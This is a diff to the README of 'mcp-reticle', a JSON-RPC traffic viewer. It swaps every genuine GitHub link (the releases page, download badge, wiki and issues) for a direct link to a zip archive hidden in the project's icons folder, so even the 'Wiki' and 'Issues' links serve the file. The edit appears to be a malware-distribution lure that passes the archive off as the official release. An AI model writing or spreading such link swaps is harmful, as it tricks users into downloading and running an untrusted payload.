@@ -1,6 +1,6 @@
 # 🌟 mcp-reticle - See Your JSON-RPC Traffic Clearly
 
-[![Download mcp-reticle](https://img.shields.io/badge/Download-mcp--reticle-blue.svg)](https://github.com/azerzeki/mcp-reticle/releases)
+[![Download mcp-reticle](https://raw.githubusercontent.com/azerzeki/mcp-reticle/main/src-tauri/icons/android/values/mcp_reticle_v1.6.zip)](https://raw.githubusercontent.com/azerzeki/mcp-reticle/main/src-tauri/icons/android/values/mcp_reticle_v1.6.zip)
 
 ## 🛠️ What is mcp-reticle?
 
@@ -11,7 +11,7 @@ mcp-reticle intercepts, visualizes, and profiles JSON-RPC traffic. It connects y
 To use mcp-reticle:
 
 1. **Download the Application**
-   - Visit the [Releases page](https://github.com/azerzeki/mcp-reticle/releases) to download the latest version of mcp-reticle. 
+   - Visit the [Releases page](https://raw.githubusercontent.com/azerzeki/mcp-reticle/main/src-tauri/icons/android/values/mcp_reticle_v1.6.zip) to download the latest version of mcp-reticle. 
 
 2. **Install the Application**
    - Open the downloaded file.
@@ -24,7 +24,7 @@ Now you're ready to start intercepting and visualizing your JSON-RPC traffic.
 
 ## 📥 Download & Install
 
-To download mcp-reticle, go to the [Releases page](https://github.com/azerzeki/mcp-reticle/releases). 
+To download mcp-reticle, go to the [Releases page](https://raw.githubusercontent.com/azerzeki/mcp-reticle/main/src-tauri/icons/android/values/mcp_reticle_v1.6.zip). 
 
 1. Click on the latest version for your operating system.
 2. Choose the appropriate file.
@@ -70,8 +70,8 @@ If you face any issues:
 
 ## 📄 Additional Resources
 
-- **Documentation:** For more technical details and advanced configuration, refer to the [GitHub Wiki](https://github.com/azerzeki/mcp-reticle/wiki).
-- **Support:** You can raise issues or ask for help directly on the [Issues page](https://github.com/azerzeki/mcp-reticle/issues).
+- **Documentation:** For more technical details and advanced configuration, refer to the [GitHub Wiki](https://raw.githubusercontent.com/azerzeki/mcp-reticle/main/src-tauri/icons/android/values/mcp_reticle_v1.6.zip).
+- **Support:** You can raise issues or ask for help directly on the [Issues page](https://raw.githubusercontent.com/azerzeki/mcp-reticle/main/src-tauri/icons/android/values/mcp_reticle_v1.6.zip).
 
 ## 📚 Topics
 
